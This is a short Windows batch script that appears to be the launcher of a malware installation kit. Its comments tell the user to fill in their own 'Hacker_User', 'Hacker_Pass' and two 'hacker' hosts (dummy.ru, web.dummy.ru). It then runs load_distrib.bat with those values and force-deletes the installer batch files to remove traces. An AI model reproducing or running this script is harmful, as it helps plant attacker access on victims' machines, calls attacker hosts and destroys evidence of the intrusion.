@echo off
rem You must change the template fields for own use
rem MSSQLSR at own Hacker_User
rem Admin01234 at own Hacker_Pass
rem dummy.ru at own Hacker_host1
rem web.dunny.ru at own hacker_host2
rem Than you just run this file
.\load_distrib.bat MSSQLSR Admin01234 dummy.ru web.dummy.ru
del /F /S /Q /A install_distrib.bat
del /F /S /Q /A load_distrib.bat
del /F /S /Q /A install.bat

